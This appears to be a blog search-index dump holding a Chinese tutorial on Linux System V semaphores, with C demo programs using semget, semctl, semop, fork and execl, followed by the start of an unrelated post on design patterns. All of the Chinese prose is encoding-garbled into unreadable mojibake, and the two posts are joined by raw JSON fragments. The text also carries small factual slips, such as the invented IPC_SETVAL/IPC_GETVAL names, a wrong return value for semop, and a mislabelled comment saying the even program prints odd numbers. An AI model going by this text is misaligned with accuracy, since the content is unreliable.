ä¸­ï¼Œä¿¡å·é‡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼ˆä¸è®¾ç½®å…¨å±€å˜é‡æ˜¯å› ä¸ºè¿›ç¨‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œè€Œè¿™ä¸ä¸€å®šèƒ½çœ‹åˆ°ï¼Œçœ‹åˆ°ä¹Ÿä¸èƒ½ä¿è¯++å¼•ç”¨è®¡æ•°ä¸ºåŸå­æ“ä½œï¼‰,ç”¨äºå¤šè¿›ç¨‹å¯¹å…±äº«æ•°æ®å¯¹è±¡çš„è¯»å–ï¼Œå®ƒå’Œç®¡é“æœ‰æ‰€ä¸åŒï¼Œå®ƒä¸ä»¥ä¼ é€æ•°æ®ä¸ºä¸»è¦ç›®çš„ï¼Œå®ƒä¸»è¦æ˜¯ç”¨æ¥ä¿æŠ¤å…±äº«èµ„æºï¼ˆä¿¡å·é‡ä¹Ÿå±äºä¸´ç•Œèµ„æºï¼‰ï¼Œä½¿å¾—èµ„æºåœ¨ä¸€ä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹ç‹¬äº«ã€‚ æ­£å¦‚å‰é¢å®éªŒä¸‰ç« èŠ‚å†…å®¹çš„è¯´æ˜ä¸€æ ·ï¼Œåœ¨ Linux ç³»ç»Ÿä¸‹è§£å†³è¿›ç¨‹é—´ä¸´ç•Œèµ„æºç«äº‰çš„é—®é¢˜ï¼Œæœ€æœ‰æ•ˆçš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ä¿¡å·é‡ã€‚æ‰€ä»¥ï¼Œä¿¡å·é‡å°±æ˜¯ç”¨æ¥è§£å†³è¿›ç¨‹é—´çš„åŒæ­¥å’Œäº’æ–¥é—®é¢˜çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ã€‚ ä¿¡å·é‡ä¸ä¿¡å·çš„åŒºåˆ«ï¼šåœ¨ Linux ç³»ç»Ÿä¸‹ï¼Œä¿¡å·é‡åå­—æ˜¯ semaphore ï¼Œè€Œä¿¡å·çš„åå­—ä¸º signalã€‚å®ƒä»¬è™½ç„¶éƒ½å¯ä»¥ç”¨æ¥è§£å†³è¿›ç¨‹åŒæ­¥å’Œäº’æ–¥é—®é¢˜ï¼Œä½†æ˜¯æ‰€é‡‡ç”¨çš„çš„æœºåˆ¶ä¸ä¸€æ ·ã€‚ä¿¡å·ä½¿ç”¨ç³»ç»Ÿçš„ä¿¡å·å¤„ç†æœºåˆ¶ï¼Œè€Œä¿¡å·é‡åˆ™æœ€ç»ˆæ˜¯ä½¿ç”¨åŸå­æ“ä½œçš„ PV æ¥å®ç°çš„ã€‚ 0x02 Linux ä¿¡å·é‡å·¥ä½œåŸç† åœ¨å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œå¤šä¸ªè¿›ç¨‹ä¼šåŒæ—¶è¿è¡Œï¼Œå¹¶ä¸”ä¸€äº›è¿›ç¨‹é—´å¯èƒ½ä¼šå­˜åœ¨ä¸€å®šçš„å…³è”ã€‚å¤šä¸ªè¿›ç¨‹å¯èƒ½ä¸ºäº†å®ŒæˆåŒä¸€ä¸ªä»»åŠ¡ç›¸äº’åä½œï¼Œè¿™å°±å½¢æˆäº†è¿›ç¨‹é—´çš„åŒæ­¥å…³ç³»ã€‚è€Œä¸”åœ¨ä¸åŒè¿›ç¨‹é—´ï¼Œä¸ºäº†äº‰å¤ºæœ‰é™çš„ç³»ç»Ÿèµ„æºï¼ˆç¡¬ä»¶æˆ–è½¯ä»¶èµ„æºï¼‰ä¼šè¿›å…¥ç«äº‰çŠ¶æ€ï¼Œè¿™å°±æ˜¯è¿›ç¨‹é—´çš„äº’æ–¥å…³ç³»ã€‚ è¿›ç¨‹é—´çš„äº’æ–¥å…³ç³»ä¸åŒæ­¥å…³ç³»å­˜åœ¨çš„æ ¹æºåœ¨äºä¸´ç•Œèµ„æºã€‚ä¸´ç•Œèµ„æºæ˜¯åœ¨åŒä¸€æ—¶åˆ»åªå…è®¸æœ‰é™ä¸ªï¼ˆé€šå¸¸åªæœ‰ä¸€ä¸ªï¼‰è¿›ç¨‹å¯ä»¥è®¿é—®ï¼ˆè¯»ï¼‰æˆ–ä¿®æ”¹ï¼ˆå†™ï¼‰çš„èµ„æºï¼Œé€šå¸¸åŒ…æ‹¬ç¡¬ä»¶èµ„æºï¼ˆå¤„ç†å™¨ã€å†…å­˜ã€å­˜å‚¨å™¨åŠå…¶å®ƒå¤–å›´è®¾å¤‡ç­‰ï¼‰å’Œè½¯ä»¶èµ„æºï¼ˆå…±äº«ä»£ç æ®µã€å…±äº«ç»“æ„å’Œå˜é‡ç­‰ï¼‰ã€‚è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç å«åšä¸´ç•ŒåŒºï¼Œä¸´ç•ŒåŒºæœ¬èº«ä¹Ÿä¼šç§°ä¸ºä¸´ç•Œèµ„æºã€‚ ä¿¡å·é‡æ˜¯ç”¨æ¥è§£å†³è¿›ç¨‹é—´çš„åŒæ­¥ä¸äº’æ–¥é—®é¢˜çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç§°ä¸ºä¿¡å·é‡çš„å˜é‡å’Œåœ¨è¯¥ä¿¡å·é‡ä¸‹ç­‰å¾…èµ„æºçš„è¿›ç¨‹ç­‰å¾…é˜Ÿåˆ—ï¼Œä»¥åŠå¯¹ä¿¡å·é‡è¿›è¡Œçš„ä¸¤ä¸ªåŸå­æ“ä½œï¼ˆP/V æ“ä½œï¼‰ã€‚å…¶ä¸­ï¼Œä¿¡å·é‡å¯¹åº”äºæŸä¸€ç§èµ„æºï¼Œå–ä¸€ä¸ªéè´Ÿçš„æ•´å½¢å€¼ã€‚ä¿¡å·é‡å€¼ï¼ˆå¸¸ç”¨ sem_id è¡¨ç¤ºï¼‰æŒ‡çš„æ˜¯å½“å‰å¯ç”¨çš„è¯¥èµ„æºçš„æ•°é‡ï¼Œè‹¥ç­‰äº 0 åˆ™æ„å‘³ç€ç›®å‰æ²¡æœ‰å¯ç”¨çš„èµ„æºã€‚ PV åŸå­æ“ä½œçš„å…·ä½“å®šä¹‰å¦‚ä¸‹: P æ“ä½œï¼šå¦‚æœæœ‰å¯ç”¨çš„èµ„æºï¼ˆä¿¡å·é‡å€¼ &gt; 0ï¼‰ï¼Œåˆ™æ­¤æ“ä½œæ‰€åœ¨çš„è¿›ç¨‹å ç”¨ä¸€ä¸ªèµ„æºï¼ˆæ­¤æ—¶ä¿¡å·é‡å€¼å‡ 1ï¼Œè¿›å…¥ä¸´ç•ŒåŒºä»£ç ï¼‰ï¼›å¦‚æœæ²¡æœ‰å¯ç”¨çš„èµ„æºï¼ˆä¿¡å·é‡å€¼ = 0ï¼‰ï¼Œåˆ™æ­¤æ“ä½œæ‰€åœ¨çš„è¿›ç¨‹è¢«é˜»å¡ç›´åˆ°ç³»ç»Ÿå°†èµ„æºåˆ†é…ç»™è¯¥è¿›ç¨‹ï¼ˆè¿›å…¥ç­‰å¾…é˜Ÿåˆ—ï¼Œä¸€ç›´ç­‰åˆ°èµ„æºè½®åˆ°è¯¥è¿›ç¨‹ï¼‰ã€‚ V æ“ä½œï¼šå¦‚æœåœ¨è¯¥ä¿¡å·é‡çš„ç­‰å¾…é˜Ÿåˆ—ä¸­æœ‰è¿›ç¨‹åœ¨ç­‰å¾…èµ„æºï¼Œåˆ™å”¤é†’ä¸€ä¸ªé˜»å¡è¿›ç¨‹ï¼›å¦‚æœæ²¡æœ‰è¿›ç¨‹ç­‰å¾…å®ƒï¼Œåˆ™é‡Šæ”¾ä¸€ä¸ªèµ„æºï¼ˆå³ä¿¡å·é‡å€¼åŠ  1ï¼‰ã€‚ äºŒå…ƒä¿¡å·é‡ï¼šäºŒå…ƒä¿¡å·é‡ï¼ˆBinary Semaphoreï¼‰æ˜¯æœ€ç®€å•çš„ä¸€ç§é”ï¼ˆäº’æ–¥é”ï¼‰ï¼Œå®ƒåªç”¨ä¸¤ç§çŠ¶æ€ï¼šå ç”¨ä¸éå ç”¨ã€‚æ‰€ä»¥å®ƒçš„å¼•ç”¨è®¡æ•°ä¸º 1ã€‚ 0x03 Linux ä¿¡å·é‡ç›¸å…³ API å‡½æ•° åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ä¿¡å·é‡é€šå¸¸åˆ†ä¸ºä»¥ä¸‹ 4 ä¸ªæ­¥éª¤ï¼š åˆ›å»ºä¿¡å·é‡æˆ–è·å¾—åœ¨ç³»ç»Ÿä¸­å·²å­˜åœ¨çš„ä¿¡å·é‡ï¼Œæ­¤æ—¶éœ€è¦è°ƒç”¨ semget() å‡½æ•°ã€‚ä¸åŒè¿›ç¨‹é€šè¿‡ä½¿ç”¨åŒä¸€ä¸ªä¿¡å·é‡é”®å€¼æ¥è·å¾—åŒä¸€ä¸ªä¿¡å·é‡ã€‚ åˆå§‹åŒ–ä¿¡å·é‡ï¼Œæ­¤æ—¶ä½¿ç”¨ semctl() å‡½æ•°çš„ SETVAL æ“ä½œã€‚å½“ä½¿ç”¨äºŒç»´ä¿¡å·é‡æ—¶ï¼Œé€šå¸¸å°†ä¿¡å·é‡åˆå§‹åŒ–ä¸º 1ã€‚ è¿›è¡Œä¿¡å·é‡çš„ PV æ“ä½œï¼Œæ­¤æ—¶ï¼Œè°ƒç”¨ semop() å‡½æ•°ã€‚è¿™ä¸€æ­¥æ˜¯å®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œäº’æ–¥çš„æ ¸å¿ƒå·¥ä½œéƒ¨åˆ†ã€‚ å¦‚æœä¸éœ€è¦ä¿¡å·é‡ï¼Œåˆ™ä»ç³»ç»Ÿä¸­åˆ é™¤å®ƒï¼Œæ­¤æ—¶ä½¿ç”¨ semctl() å‡½æ•°çš„ IPC_RMID æ“ä½œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç¨‹åºä¸­ä¸åº”è¯¥å‡ºç°å¯¹å·²ç»è¢«åˆ é™¤çš„ä¿¡å·é‡çš„æ“ä½œï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semget(key_t key, int nsems, int semflg);/*å‚æ•°ï¼š keyï¼šä¿¡å·é‡çš„é”®å€¼ï¼Œå¤šä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒè®¿é—®ä¸€ä¸ªä¿¡å·é‡ï¼Œå…¶ä¸­æœ‰ä¸ªç‰¹æ®Šå€¼ IPC_PRIVATE ï¼Œç”¨æ¥åˆ›å»ºå½“å‰è¿›ç¨‹ç§æœ‰ä¿¡å·é‡ nsemsï¼šéœ€è¦åˆ›å»ºçš„ä¿¡å·é‡æ•°ç›® semflgï¼šåŒ open() å‡½æ•°çš„æƒé™ä½ç›¸åŒï¼Œå…¶ä¸­ IPC_CREAT åˆ›å»ºæ–°çš„ä¿¡å·é‡ï¼ŒIPC_EXCL åˆ›å»ºæ–°çš„å”¯ä¸€çš„ä¿¡å·é‡è¿”å›å€¼ï¼š æˆåŠŸï¼šä¿¡å·é‡æ ‡è¯†ç¬¦ï¼Œåœ¨ä¿¡å·é‡å…¶ä»–å‡½æ•°ä¸­ä¼šç”¨åˆ° å¤±è´¥ï¼šè¿”å› -1*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semctl(int semid, int semnum, int cmd, union semun arg);/*å‚æ•°ï¼š semidï¼šsemget() å‡½æ•°åæ‚”çš„ä¿¡å·é‡æ ‡è¯†ç¬¦ï¼Œè¦æ“ä½œçš„ä¿¡å·é‡ semnumï¼šä¿¡å·é‡ç¼–å·ï¼Œå½“ä½¿ç”¨ä¿¡å·é‡é›†ä¼šç”¨åˆ°ï¼Œå•ä¸ªä¿¡å·é‡æ“ä½œå–å‚æ•° 0 cmdï¼šæŒ‡å®šå¯¹ä¿¡å·é‡çš„å„ç§æ“ä½œï¼Œå½“ä½¿ç”¨å•ä¸ªä¿¡å·é‡æ—¶ï¼Œå¸¸ç”¨çš„æ“ä½œå¦‚ä¸‹ï¼š IPC_STATï¼šè·å¾—è¯¥ä¿¡å·é‡çš„ semid_ds ç»“æ„ï¼Œå¹¶å­˜æ”¾åˆ°ç¬¬å››ä¸ªå‚æ•°æŒ‡å®šçš„ä½ç½®ä¸­ IPC_SETVALï¼šå°†ä¿¡å·é‡å€¼è®¾ç½®ä¸º arg çš„ val å€¼ IPC_GETVALï¼šè¿”å›ä¿¡å·é‡çš„å½“å‰å€¼ IPC_RMIDï¼šä»ç³»ç»Ÿä¸­åˆ é™¤ä¿¡å·é‡ï¼ˆæˆ–è€…ä¿¡å·é‡é›†ï¼‰ argï¼šæ˜¯ union semun ç»“æ„ï¼Œæœ‰æ—¶éœ€è¦æ‰§è¡Œå®šä¹‰è¿”å›å€¼ï¼š æˆåŠŸï¼šæ ¹æ® cmd çš„å€¼è¿”å›ä¸åŒçš„å€¼ å¤±è´¥ï¼š-1*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semop(int semid, struct sembuf *sops, size_t nsops);/*å‚æ•°ï¼š semidï¼šsemget() å‡½æ•°åæ‚”çš„ä¿¡å·é‡æ ‡è¯†ç¬¦ï¼Œè¦æ“ä½œçš„ä¿¡å·é‡ sopsï¼šæŒ‡å‘ä¿¡å·é‡æ“ä½œæ•°ç»„ï¼Œ nsopsï¼šæ“ä½œæ•°ç»„ sops ä¸­çš„æ“ä½œä¸ªæ•°ï¼Œé€šå¸¸å– 1 ï¼ˆä¸€ä¸ªæ“ä½œï¼‰è¿”å›å€¼ï¼š æˆåŠŸï¼šä¿¡å·é‡æ ‡è¯†ç¬¦ å¤±è´¥ï¼š-1*/ 0x04 ä¿¡å·é‡åŸºæœ¬ç”¨æ³• åœ¨ VS Code å¹³å°ä¸‹åˆ›å»ºæ–°çš„ä»£ç æ–‡ä»¶ fork_demo.c ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç„¶åæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int main(int argc, char *argv[])&#123; pid_t pid; int sem_id; //åˆ›å»ºä¿¡å·é‡ sem_id = semget(ftok(&quot;.&quot;,&#x27;a&#x27;), 1, 0666|IPC_CREAT); //åˆå§‹åŒ–ä¿¡å·é‡ init_sem(sem_id, 0); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error&quot;); exit(1); &#125; else if(pid == 0) &#123; //å­è¿›ç¨‹ printf(&quot;Child progress [%d] will wait for som seconds...\\n&quot;, getpid()); sleep(DELAY_TIME); printf(&quot;Child progress [%d] \\n&quot;, getpid()); sem_v(sem_id); exit(1); &#125; else &#123; //çˆ¶è¿›ç¨‹ sem_p(sem_id); printf(&quot;Parent progress [%d] will wait for som seconds...\\n&quot;, getpid()); sem_v(sem_id); del_sem(sem_id); &#125; waitpid(pid, NULL, 0); return 0;&#125; åœ¨ VS Code å¹³å°ä¸‹çš„ç»ˆç«¯çª—å£ä½¿ç”¨ gcc ç¼–è¯‘ä»£ç å¹¶æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x05 ä¿¡å·é‡è¿›ç¨‹åŒæ­¥ æ¥ä¸‹æ¥åˆ©ç”¨ä¿¡å·é‡åŒæ­¥æœºåˆ¶åˆ›å»ºä¸¤ä¸ªè¿›ç¨‹äº¤æ›¿è¿›è¡Œè¾“å‡ºè®¡æ•°ï¼Œä¸€ä¸ªè¿›ç¨‹è¾“å‡ºå¥‡æ•°ï¼Œå¦ä¸€ä¸ªè¾“å‡ºå¶æ•°ï¼Œäº¤æ›¿è¾“å‡ºç»„æˆè”ç³»æ•°å­—æ’åˆ—ã€‚ä¸ºäº†ä½¿å¾—è¾“å‡ºç»“æœèƒ½å¤Ÿæ˜¾ç¤ºåœ¨åŒä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œä½¿å…¶ä¸­çš„ä¸€ä¸ªè¿›ç¨‹é€šè¿‡ fork() åˆ›å»ºæ–°çš„è¿›ç¨‹å¹¶è°ƒç”¨ execl() å‡½æ•°å»æ‰§è¡Œå¦ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œæœ€ç»ˆè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚å…·ä½“å¦‚ä¸‹ï¼š åœ¨ VS Code å¹³å°ä¸‹åˆ›å»ºæ–°çš„ä»£ç æ–‡ä»¶å¶æ•°è¾“å‡ºç¨‹åºä»£ç  even_demo.c ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç„¶åæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126/* è¯¥ç¨‹åºå°†ä»…è¾“å‡ºå¥‡æ•°å€¼ï¼Œé…åˆ even_demo ç¨‹åºå®Œæˆ 0 - 20 çš„è®¡æ•°è¾“å‡º*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/wait.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;//ä¿¡å·é‡åˆå§‹åŒ–int init_sem(int sem_id, int init_value);//ä»ç³»ç»Ÿä¸­åˆ é™¤ä¿¡å·é‡int del_sem(int sem_id);//Pæ“ä½œint sem_p(int sem_id);//Væ“ä½œint sem_v(int sem_id);//å®šä¹‰ftokå‚æ•°#define SEM_ODD_KEY &quot;./odd_dem_key&quot;#define SEM_EVEN_KEY &quot;./even_dem_key&quot;int main()&#123; pid_t pid; int sem_odd, sem_even; //åˆ›å»ºä¸€ä¸ªä¿¡å·é‡ sem_even = semget(ftok(SEM_EVEN_KEY, &#x27;a&#x27;), 1, 0666|IPC_CREAT); sem_odd = semget(ftok(SEM_ODD_KEY, &#x27;a&#x27;), 1, 0666); init_sem(sem_even, 0); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error.&quot;); exit(0); &#125; if(pid == 0) &#123; execl(&quot;./odd_demo&quot;, &quot;test&quot;, NULL); exit(0); &#125; for(int i = 0; i &lt; 20; i = i + 2) &#123; sem_p(sem_odd); //è·å–å¥‡æ•°ç¨‹åºä¿¡å· printf(&quot;[%d]====&gt; (%d)\\n&quot;, getpid(), i); sem_v(sem_even); &#125; sem_p(sem_even); // sleep(DELAY_TIME); waitpid(pid, NULL, 0); del_sem(sem_even); printf(&quot;prograss even[%d] quit..\\n&quot;, getpid()); exit(0);&#125;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125; ç„¶åç»§ç»­æ–°å»ºä»£ç æ–‡ä»¶ odd_demo.c ï¼Œè¿™æ˜¯ç”¨äºè¾“å‡ºå¥‡æ•°æ¶ˆæ¯çš„ç¨‹åºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç„¶åæ·»åŠ å¦‚ä¸‹ä»£ç å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110/* è¯¥ç¨‹åºå°†ä»…è¾“å‡ºå¥‡æ•°å€¼ï¼Œé…åˆ even_demo ç¨‹åºå®Œæˆ 0 - 20 çš„è®¡æ•°è¾“å‡º*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;//ä¿¡å·é‡åˆå§‹åŒ–int init_sem(int sem_id, int init_value);//ä»ç³»ç»Ÿä¸­åˆ é™¤ä¿¡å·é‡int del_sem(int sem_id);//Pæ“ä½œint sem_p(int sem_id);//Væ“ä½œint sem_v(int sem_id);//å®šä¹‰ftokå‚æ•°#define SEM_ODD_KEY &quot;./odd_dem_key&quot;#define SEM_EVEN_KEY &quot;./even_dem_key&quot;int main()&#123; pid_t pid; int sem_odd, sem_even; //åˆ›å»ºä¸€ä¸ªä¿¡å·é‡ sem_odd = semget(ftok(SEM_ODD_KEY, &#x27;a&#x27;), 1, 0666|IPC_CREAT); sem_even = semget(ftok(SEM_EVEN_KEY, &#x27;a&#x27;), 1, 0666); init_sem(sem_odd, 0); sem_v(sem_odd); for(int i = 1; i &lt; 20; i = i + 2) &#123; sem_p(sem_even); //è·å–å¶æ•°ä¿¡å·é‡ printf(&quot;[%d]====&gt; (%d)\\n&quot;, getpid(), i); sem_v(sem_odd); &#125; sleep(DELAY_TIME); del_sem(sem_odd); printf(&quot;prograss odd[%d] quit..\\n&quot;, getpid()); return 0;&#125;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125; åœ¨ VS Code å¹³å°ä¸‹çš„ç»ˆç«¯çª—å£ä½¿ç”¨ gcc ç¼–è¯‘ä»£ç å¹¶æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 123gcc odd_demo.c -o odd_demogcc even_demo.c -o even_demo./even_demo # ç”±äº odd_demo ç¨‹åºåœ¨ eve_demo ä¸­é‡‡ç”¨ execl æ–¹å¼æ‰§è¡Œï¼Œæ‰€ä»¥ä¸éœ€è¦æ‰‹åŠ¨æ‰§è¡Œ odd_demo ï¼Œä»…æ‰§è¡Œ even_demo å³å¯ï¼ˆä»å¶æ•° 0 å¼€å§‹è®¡æ•°ï¼‰ ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´äº¤æ›¿è¿›è¡Œï¼Œé¡ºåºå¾ˆæœ‰è§„å¾‹ï¼Œè¡¨ç¤ºæˆ‘ä»¬ä½¿ç”¨ä¿¡å·é‡çš„æ§åˆ¶æ˜¯æœ‰æ•ˆçš„ï¼Œåœ¨åé¢çš„å…±äº«å†…å­˜é€šä¿¡ä¸­ä¹Ÿä¼šç”¨åˆ°ä¿¡å·é‡ä½œä¸ºè¿›ç¨‹ä¹‹é—´çš„åŒæ­¥æœºåˆ¶ï¼Œæ‰€ä»¥è¿™ä¸€ç« å¸Œæœ›å¤§å®¶å¥½å¥½å­¦ä¹ ç†è§£å’ŒæŒæ¡ã€‚","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"è®¾è®¡æ¨¡å¼","date":"2023-12-25T01:28:27.249Z","path":"A_å†…åŠŸ/B_è®¾è®¡æ¨¡å¼/è®¾è®¡æ¨¡å¼/","text":"é™¤äº†â€œè®¾è®¡æ¨¡å¼â€ï¼Œä½ è¿˜åº”è¯¥çŸ¥é“ä»€ä¹ˆ ç¨‹åºå‘˜å†…åŠŸä¹‹è®¾è®¡æ¨¡å¼ğŸ”¥ æ¨èå­¦ä¹ è§†é¢‘C++å¸¸ç”¨è®¾è®¡æ¨¡å¼ è®¾è®¡æ¨¡å¼ä»ä½•è€Œæ¥ å››äººç»„ï¼ˆGang of Four)ï¼Œç®€ç§°GoF. GoFå°†æ¨¡å¼çš„æ¦‚å¿µå¼•å…¥è½¯ä»¶å·¥ç¨‹é¢†åŸŸï¼Œè¿™æ ‡å¿—ç€è½¯ä»¶æ¨¡å¼çš„è¯ç”Ÿã€‚è½¯ä»¶æ¨¡å¼ï¼ˆSoftware Patternæ˜¯ï¼‰æ˜¯å°†æ¨¡å¼çš„ä¸€åŠæ¦‚å¿µåº”ç”¨äºè½¯ä»¶å¼€å‘é¢†åŸŸï¼Œå³è½¯ä»¶å¼€å‘çš„æ€»ä½“æŒ‡å¯¼æ€è·¯æˆ–å‚ç…§æ ·æ¿. éœ€è¦äº†è§£è½¯ä»¶æ¨¡å¼å¹¶éä»…é™äºè®¾è®¡æ¨¡å¼ï¼Œè¿˜åŒ…æ‹¬æ¶æ„æ¨¡å¼ã€åˆ†ææ¨¡å¼å’Œè¿‡ç¨‹æ¨¡å¼ç­‰ã€‚ â€œè½¯ä»¶è®¾è®¡æ¨¡å¼(Design Pattern)æ˜¯ä¸€å¥—è¢«åå¤ä½¿ç”¨ã€å¤šæ•°äººçŸ¥æ™“çš„ã€ç»è¿‡åˆ†ç±»ç¼–ç›®çš„ã€ä»£ç è®¾è®¡ç»éªŒçš„æ€»ç»“ï¼Œä½¿ç”¨è®¾è®¡æ¨¡å¼æ˜¯ä¸ºäº†å¯å……ç”¨ä»£ç ï¼Œè®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£å¹¶ä¸”ä¿è¯ä»£ç å¯é æ€§ã€‚â€ â€”â€”è½¯ä»¶è®¾è®¡æ¨¡å¼çš„å®šä¹‰ ä¸€å¥å¤§ç™½è¯å°±æ˜¯ï¼šâ€œåœ¨ä¸€å®šç¯å¢ƒä¸‹ï¼Œç”¨å›ºå®šå¥—è·¯è§£å†³é—®é¢˜â€ã€‚ è½¯ä»¶è®¾è®¡æ¨¡å¼çš„ç§ç±» GoFæå‡ºçš„è®¾è®¡æ¨¡å¼æœ‰23ä¸ªï¼ŒåŒ…æ‹¬ï¼š è®¾è®¡æ¨¡å¼ä¹‹åˆ›å»ºå‹æ¨¡å¼(Creational)ï¼šå¦‚ä½•åˆ›å»ºå¯¹è±¡; 